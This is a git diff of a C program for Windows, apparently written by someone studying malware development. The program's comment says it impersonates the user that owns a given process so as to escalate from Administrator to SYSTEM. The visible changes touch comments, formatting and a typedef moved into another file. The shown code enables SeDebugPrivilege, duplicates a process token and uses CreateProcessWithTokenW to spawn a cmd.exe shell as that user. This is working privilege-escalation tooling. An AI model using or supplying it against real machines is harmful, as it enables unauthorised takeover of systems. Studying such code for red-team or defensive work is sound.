@@ -1,10 +1,12 @@
 #include <Windows.h>
 #include <stdio.h>
+#include "Structs.h"
+
 
 /*
-Given a process ID (PID), impersonate the user associated with the process. 
-This is useful for privilege escalation from Administrator to SYSTEM privileges. 
-Some test with maldev-academy code snippets. 
+Given a process ID (PID), impersonate the user associated with the process.
+This is useful for privilege escalation from Administrator to SYSTEM privileges.
+Some test with maldev-academy code snippets.
 
  .\ImpersonateProcessUser.exe <PID>
 [+] SeDebugPrivilege is enabled.
@@ -42,6 +44,7 @@ Some test with maldev-academy code snippets.
  *   function uses GetLastError to determine the cause of failure in operations like
  *   opening the process token or adjusting privileges.
  */
+
 
 BOOL SetDebugPrivilege() {
 
@@ -210,11 +213,10 @@ BOOL ImpersonateProcess(DWORD dwProcessId) {
         printf("[!] ImpersonateLoggedOnUser Failed With Error: %d\n", GetLastError());
         goto _END_OF_FUNC;
     }
-    
-	//  Check CreateProcessWithTokenW
-	if (!LaunchCommandWithImpersonatedUser(hDuplicatedToken, NULL)) {
-		printf("[!] Failed to launch command with impersonated user.\n");
-	}
+    // Check LaunchCommandWithImpersonatedUser
+    if (!LaunchCommandWithImpersonatedUser(hDuplicatedToken, NULL)) {
+        printf("[!] Failed to launch command with impersonated user.\n");
+    }
 
     IsTokenElevated(hDuplicatedToken);
     bResult = TRUE;
@@ -265,13 +267,14 @@ BOOL LaunchCommandWithImpersonatedUser(HANDLE hDuplicatedToken, LPCWSTR lpApplic
     PROCESS_INFORMATION pi = { 0 };
     BOOL bResult = FALSE;
 
-    // "cmd.exe" 
+    // launch cmd 
     LPCWSTR lpCommandLine =
         L"C:\\Windows\\system32\\cmd.exe /c "
         L"echo [+] Your user now is ... && "
         L"whoami && "
         L"echo [+] Spawning your shell ... && "
         L"cmd.exe";
+    
 
     bResult = CreateProcessWithTokenW(hDuplicatedToken, LOGON_WITH_PROFILE, lpApplicationName, (LPWSTR)lpCommandLine, 0, NULL, NULL, &si, &pi);
     if (!bResult) {
@@ -296,13 +299,6 @@ BOOL LaunchCommandWithImpersonatedUser(HANDLE hDuplicatedToken, LPCWSTR lpApplic
     return TRUE;
 }
 
-// typedef for fnNtQueryInformationToken 
- typedef NTSTATUS (NTAPI *fnNtQueryInformationToken)(
-     HANDLE TokenHandle,
-     TOKEN_INFORMATION_CLASS TokenInformationClass,
-     PVOID TokenInformation,
-     ULONG TokenInformationLength,
-     PULONG ReturnLength);
  /*
   * IsTokenElevated
   * ---------------
